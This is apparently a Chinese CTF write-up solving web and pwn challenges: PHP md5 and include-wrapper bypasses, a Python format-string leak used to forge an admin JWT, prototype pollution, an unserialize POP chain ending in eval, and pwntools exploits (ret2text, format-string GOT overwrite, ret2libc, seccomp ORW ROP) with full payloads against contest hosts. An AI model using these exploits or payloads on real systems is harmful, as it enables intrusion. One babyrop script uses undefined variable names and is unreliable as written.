![image-20210921141318815](https://i.loli.net/2021/09/22/msxUQXpEF3Pvuh2.png)



### ezweb

```php
<?php
error_reporting(0);
include_once "flag";
$a=$_GET['a'];
$b=$_POST['b'];
if(isset($a)){
    if($a!=$b&&md5($a)===md5($b)){
        echo $flag;
    }else{
        echo 'try again';
    }
}else{
    highlight_file(__FILE__);
}
```

首先来看一下这里变量的设置

```php
$a=$_GET['a'];
$b=$_POST['b'];
```

代表a变量是通过get方式赋值的，b变量是通过post方式赋值的；**isset()**函数用来判断是否设置了a变量

```php
$a!=$b&&md5($a)===md5($b)
```

这里的考点是一个典型的md5绕过

```php
根据MD5的特性，有两点漏洞
1.两个开头为0的md5值相同;适用于==
2.md5不能处理数组；适用于===和==
```

### ezinclude

```php
<?php
error_reporting(0);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

主要考察伪协议的使用；这里来一个链接，可以拓展一下https://segmentfault.com/a/1190000018991087

```
data://text/plain;base64,PD9waHAgaW5jbHVkZSAnZmxhZy5waHAnOw==
data伪协议;后面是base64加密之后的<?php include 'flag.php';
?file=php://filter/read=convert.base64-encode/resource=flag.php
php伪协议；可以得到base64加密之后的flag
```

**这里是比较简单容易想到的绕过方式，可以参考上面链接尝试使用别的协议和过滤器**

### 地狱通讯

大家快去康地狱少女.jpg

简简单单python格式化字符串，[指路](https://yanluow.github.io/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/) ，payload: `{0.__class__.__init__.__globals__}`

### 地狱通讯-改

直接给出了源码

```python
from flask import Flask, render_template, request, session, redirect, make_response
from secret import secret, headers, User
import datetime
import jwt

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    res = make_response(ctx)
    name = request.args.get('name') or ''
    if 'admin' in name or name == '':
        return res
    payload = {
        "name": name,
    }
    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
    res.set_cookie('token', token)
    return res


@app.route('/hello', methods=['GET', 'POST'])
def hello():
    token = request.cookies.get('token')
    if not token:
        return redirect('/', 302)
    try:
        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
    except jwt.exceptions.InvalidSignatureError as e:
        return "Invalid token"
    if name != "admin":
        user = User(name)
        flag = request.args.get('flag') or ''
        message = "Hello {0}, your flag is" + flag
        return message.format(user)
    else:
        return render_template('flag.html', name=name)


if __name__ == "__main__":
    app.run()

```

可以看到admin去访问`/hello`时可以拿到flag，而jwt用密钥签名过，所以我们先用python格式化字符串去读取`secret`，payload同上题，然后拿这个密钥去签一个admin的token即可

```python
import jwt

secret = "u_have_kn0w_what_f0rmat_i5"
headers = {
        'alg': 'HS256',
        'typ': 'JWT'
    }

payload = {
        "name": "admin",
    }

token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
print(token)

```

拿到token直接修改或者发包都行

### fake game

预期解是原型链污染，[指路](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)，payload: `{"attributes": {"health": 0, "attack": 0, "armor": 0, "__proto__": {"health": 10000, "attack": 10000, "armor": 1000}}}`

### eeeeeeeeeeeeezunserialize

非常简单的pop链

```php
<?php

class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

if(isset($_GET['serialize'])) {
    unserialize($_GET['serialize']);
} else {
    highlight_file(__FILE__);
}
```

从entrance的`__destruct`触发，到`evil`的`eval`语句结束，利用中间那个类做跳板

```php
$a = new entrance(new springboard());
$a->start->middle = new evil("system(id);");
echo serialize($a);
```

## Pwn

### Test_your_nc

nc是通过远端连接一个ip地址，并执行该端口的应用，本题连接直接可以获取shell

> nc 的作用
>
> （1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口
> （2）端口的扫描，nc可以作为client发起TCP或UDP连接
> （3）机器之间传输文件
> （4）机器之间网络测速

![](https://i.loli.net/2021/09/23/i48zMpalEOuHUwf.png)

### Int overflow

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+14h] [rbp-Ch] BYREF
  puts("Do you no integer overflow?");
  puts("Input an int ( <0 )");
  __isoc99_scanf("%u", &v4);
  // 检查符号位是否为1
  if ( (v4 & 0x80000000) == 0 )  
  {
    puts("<0 ?");
  }
  else
  {
    puts("But I want <0 now!");
    printf("%d\n", v4);
    // 再次检查v4是否大于零
    if ( v4 )
    {
      puts("You know int overflow!");
      system("/bin/sh");
    }
    else
    {
      puts(">0 ?");
    }
  }
  return 0;
}
```

本题只要保证输入的无符号数首位为1，并且类型转换为int后大于零即可

> int类型在内存以二进制存储，存储方式为：首位为符号位，0表示正，1表示负
> unsigned int则无符号位

### Int_revenge

```C
int sell_watermelon()
{
  int v1; // [esp+8h] [ebp-210h] BYREF
  unsigned __int8 v2; // [esp+Fh] [ebp-209h] BYREF
  int v3[130]; // [esp+10h] [ebp-208h] BYREF

  memset(v3, 0, 0x200u);
  puts("128 watermelons there, choose one and input the index: ");
  v2 = 0;
  while ( 1 )
  {
    __isoc99_scanf("%hhd", &v2);
    if ( check((char)v2, 128) )
      break;
    puts("not so much");
    puts("128 watermelons there, choose one and input the index: ");
  }
  puts("Confirm the weight");
  puts("The real weight is 13 * 500g, (15 with XiTieShi)");
  puts("Change the weight?(1 for yes)");
  __isoc99_scanf("%d", &v1);
  if ( v1 == 1 )
  {
    puts("Input the weight to change: ");
    __isoc99_scanf("%d", &v3[v2]);
  }
  else
  {
    v3[(char)v2] = 15;
  }
  return v3[v2];
}
```

```C
_BOOL4 __cdecl check(char a1, unsigned __int8 a2)
{
  return a1 < (int)a2;
}
```

![](https://i.loli.net/2021/09/24/jA2zObZ89uMnwSl.png)

-125选择栈上的一个位置，在后面赋值的时候可以设法更改return地址，从而控制程序流

赋值时有一个类型转换，可以使得数组越界，即-125转换后就是131

![](https://i.loli.net/2021/09/24/GwOKCqruYnNVMF2.png)

var_208距离return有132个int的偏移，但是数组首个位置为0，所以要更改131位置的值

### ret2text

这道题有个栈对齐的问题，需要在返回地址加入若干个ret的指令

```python
from pwn import *
p = remote('pwn.blackbird.wang', 9502)
backdoor = 0x400687
ret = 0x0000000000400546
payload = b'a' * (10 + 8) + p64(ret) + p64(backdoor)
p.send(payload)
p.interactive()
```

![没修栈](https://i.loli.net/2021/09/24/AnRXZl4mh3ypdjD.png)

gdb调试时只要可以进入控制程序流进入system, 但是没拿shell，就可以加个ret试验，一个不行就两个

![调试的时候卡住了](https://i.loli.net/2021/09/24/IW8CkLzcRUnrTp6.png)

ret指令的获取

```shell
$ ROPgadget --binary ret2text | grep ret 
0x00000000004005c9 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x00000000004005cf : add bl, dh ; ret
0x00000000004007ad : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004007ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000400730 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004007ac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400731 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000400732 : add byte ptr [rax], al ; leave ; ret
0x0000000000400606 : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004005ce : add byte ptr [rax], al ; ret
0x0000000000400605 : add byte ptr [rax], r8b ; pop rbp ; ret
0x00000000004005cd : add byte ptr [rax], r8b ; ret
0x0000000000400667 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400733 : add cl, cl ; ret
0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x0000000000400543 : add esp, 8 ; ret
0x0000000000400542 : add rsp, 8 ; ret
0x00000000004005c8 : and byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x000000000040078c : fmul qword ptr [rax - 0x7d] ; ret
0x00000000004005ca : hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000400734 : leave ; ret
0x0000000000400662 : mov byte ptr [rip + 0x200a1f], 1 ; pop rbp ; ret
0x000000000040072f : mov eax, 0 ; leave ; ret
0x0000000000400697 : nop ; pop rbp ; ret
0x0000000000400603 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004005cb : nop dword ptr [rax + rax] ; ret
0x0000000000400645 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400665 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400608 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400546 : ret
0x000000000040053d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004007b5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004007b4 : sub rsp, 8 ; add rsp, 8 ; ret

```



### babyfmt

首先要检查一下我们输入的字符串在栈上的位置

```python
stack 30
00:0000│ esp 0xff983b40 —▸ 0xff983b68 —▸ 0x804c044 ◂— 0x602583a0
01:0004│     0xff983b44 —▸ 0xff983b68 —▸ 0x804c044 ◂— 0x602583a0
02:0008│     0xff983b48 ◂— 0x63 /* 'c' */
03:000c│     0xff983b4c ◂— 0x0
04:0010│     0xff983b50 —▸ 0xf7fc8a9c —▸ 0xf7f9b3e0 —▸ 0xf7fc8940 ◂— 0x0
05:0014│     0xff983b54 ◂— 0x3
06:0018│     0xff983b58 —▸ 0xf7f9b410 —▸ 0x804837f ◂— 'GLIBC_2.0'
07:001c│     0xff983b5c ◂— 0x1
08:0020│     0xff983b60 ◂— 0x0
09:0024│     0xff983b64 ◂— 0x1
0a:0028│ eax 0xff983b68 —▸ 0x804c044 ◂— 0x602583a0
0b:002c│     0xff983b6c —▸ 0x804c045 ◂— 0x602583

```

可以很明显地看出 eax 指向的地方就是我们的输入，相对于格式化第一个参数的偏移是10，这时候就能利用 %n 来任意值写入了

```python
  1 from pwn import *
  2 
  3 sh = process("./babyfmt")
  4 
  5 payload = p32(0x0804C044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)
  6 payload += b'%10$n%11$n%12$n%13$n'
  7 
  8 sh.sendline(payload)
  9 # 0x10101010  4 * len(p32()) = 0x10
 10 sh.sendline(str(0x10101010))
 11 
 12 sh.interactive()
```



### babyrop

很基本的rop，也没开pie

查看ida发现只有 system 函数而没有 /bin/sh 字符串

这时候可以利用 gets 函数来写入 /bin/sh 字符串

字符串的地址可以写在 bss 段上

然后利用 gets 函数来溢出，覆盖返回地址为 gets plt 地址，gets plt的返回地址再写为 system plt 地址，最后放上字符串参数的地址

```python
  1	from pwn import *
  2 
  3 context.log_level = "debug"
  4 sh = process("./babyrop")
  5 
  6 bss_addr = 0x0804A028
  7 sys_plt = 0x080483A0
  8 gets_plt = 0x08048380
  9 
 10 sh.recvuntil("advise?")
 11 payload = b'a'*(0x28+4) + p32(gets_addr) + p32(sys_addr) + p32(bss_addr) +  p32(bss_addr)
 12 
 13 #gdb.attach(sh)
 14 #pause()
 15 
 16 sh.sendline(payload)
 17 
 18 payload = b"/bin//sh"
 19 sh.sendline(payload)
 20 
 21 sh.interactive()
```



### ezrop

先放上 libc 版本吧 `2.27-3ubuntu1.4`

因为是 64 位程序，所以传参并不是在栈上的，而且程序没有开启 PIE，可以使用 ROPgadget 来寻找 `pop rdi` 以及 `ret`

这一题的关键在于那个 encrypt 函数，它会对我们输入的 shellcode 进行加密从而破坏我们的 shellcode

因为 strlen 函数是检测 '\0' 来检测字符串长度的，所以我们只要在 shellcode 的开始写入 '\0' 即可绕过加密

注意：64位程序调用 system 函数时会检测是否 0x10 是否对齐，所以要使用`ret`来调整偏移

```python
  1 from pwn import*
  2 from LibcSearcher import*
  3 
  4 r=process("./ezrop")
  5 elf=ELF("./ezrop")
  6 
  7 main=0x400b28
  8 pop_rdi=0x400c83
  9 ret=0x4006b9
 10 
 11 puts_plt = elf.plt['puts']
 12 puts_got = elf.got['puts']
 13 
 14 r.sendlineafter('choice!\n','1')
 15 payload ='\0'+'a'*(0x50-1+8)
 16 payload += p64(pop_rdi)
 17 payload += p64(puts_got)
 18 payload += p64(puts_plt)
 19 payload += p64(main)
 20 
 21 r.sendlineafter('encrypted\n',payload)
 22 r.recvline() 
 23 r.recvline()
 24 
 25 puts_addr = u64(r.recvuntil('\n')[:-1].ljust(8,'\0'))
 26 print(hex(puts_addr))
 27 
 28 libc = LibcSearcher('puts',puts_addr)
 29 offset = puts_addr-libc.dump('puts')
 30 binsh = offset+libc.dump('str_bin_sh')
 31 system = offset+libc.dump('system')
 32 
 33 r.sendlineafter('choice!\n','1')
 34 
 35 payload = '\0'+'a'*(0x50-1+8)
 36 payload += p64(ret)
 37 payload += p64(pop_rdi)
 38 payload += p64(binsh)
 39 payload += p64(system)
 40   
 41 r.sendlineafter('encrypted\n',payload)
 42  
 43 r.interactive()
```

### Human's Nature

EXP:

```python
from pwn import*
context(arch='amd64', os='linux', log_level='debug')


def uu32(data): return u32(data.ljust(4, '\x00'))
def uu64(data): return u64(data.ljust(8, '\x00'))


p = remote('pwn.blackbird.wang', 9505)
# p = process(['./hijack'],env={"LD_PRELOAD":"./libc-2.27.so"})
elf = ELF('./hijack')
libc = ELF('./libc-2.27.so')


printf_got = elf.got['printf']
p.recvuntil("What's human's nature???\n")
p.recvuntil("What's human's nature???\n")
p.recvline()

payload = b'%23$p'
p.sendline(payload)

elf_base = int(p.recvline().strip(), 16)-0x1303
log.info(f"elf_base--->{elf_base}")
printf_got = elf_base + printf_got

p.recv()

payload = b'%25$p'
p.sendline(payload)

tmp = p.recvline().strip()
log.info(f"test--->{tmp}")
libc_base = int(tmp, 16)-231-libc.symbols['__libc_start_main']
one_gadget = libc_base+0x4f432

payload = fmtstr_payload(8, {printf_got: one_gadget})
p.sendline(payload)

p.interactive()

```

emm……题目很简单，基本上就是模板题，[例子 hijack-got)](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/#hijack-got)， 然后不大一样的就是我的题目开pie了，，，就是需要多输出一遍，找一个程序的地址算出elf_base



### special_ROP

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')


def uu32(data): return u32(data.ljust(4, '\x00'))
def uu64(data): return u64(data.ljust(8, '\x00'))


#p = process(['./orw'],env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.4_amd64.so"})
p = remote("pwn.blackbird.wang", 9507)
elf = ELF('./orw')
libc = ELF('./libc-2.27.so')


# gadgets

#puts_plt     = elf.plt['puts']
#puts_got     = elf.got['puts']
pop_rdi = 0x401503
pop_rsi_r15 = 0x401501
start = 0x401140
bss_addr = 0x404080
return_addr = 0x401490
vuln = 0x401422

p.recvuntil('Before that here is a gift: ')
puts_addr = int(p.recvline().strip(b'\n'), 16)
print(hex(puts_addr))

libc_base = puts_addr-libc.symbols['puts']
open_addr = libc_base+libc.symbols['open']
read_addr = libc_base+libc.symbols['read']
write_addr = libc_base+libc.symbols['write']
gets_addr = libc_base+libc.symbols['gets']

pop_rax = libc_base+next(libc.search(asm('pop rax\nret')))
pop_rsi = libc_base+next(libc.search(asm('pop rsi\nret')))
syscall = libc_base+next(libc.search(asm('syscall\nret')))
pop_rdx_rsi = libc_base+0x130569

print('open:', hex(open_addr))
print('read:', hex(read_addr))
print('write:', hex(write_addr))

p.recvuntil('Here is a message book:\n\n')

payload = b'A'*(0x78)+p64(pop_rdi)+p64(bss_addr)+p64(gets_addr)+p64(vuln)

p.sendline(payload)
p.sendline('./flag')

payload = b'A'*(0x78)+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi) + \
    p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
payload += p64(pop_rdi)+p64(3)+p64(pop_rdx_rsi)+p64(0x20) + \
    p64(bss_addr+8)+p64(read_addr)+p64(vuln)

p.recvuntil('Here is a message book:\n\n')
p.sendline(payload)

p.recvuntil('Here is a message book:\n\n')

payload = b'A'*(0x78)+p64(pop_rdi)+p64(1)+p64(pop_rdx_rsi) + \
    p64(0x20)+p64(bss_addr+8)+p64(write_addr)+p64(return_addr)

p.sendline(payload)
p.recvuntil('Copy that!!!!\n')
print(p.recv())
```

这个题，就是加了一个沙箱壳，然后仅允许open、read、write三个系统调用，那我们可以直接通过rop，open flag文件，read、再write出来……但是这个题，我出的稍微有点难了……可能需要去libc里面寻找合适的gadget，其余的应该比较常规了。
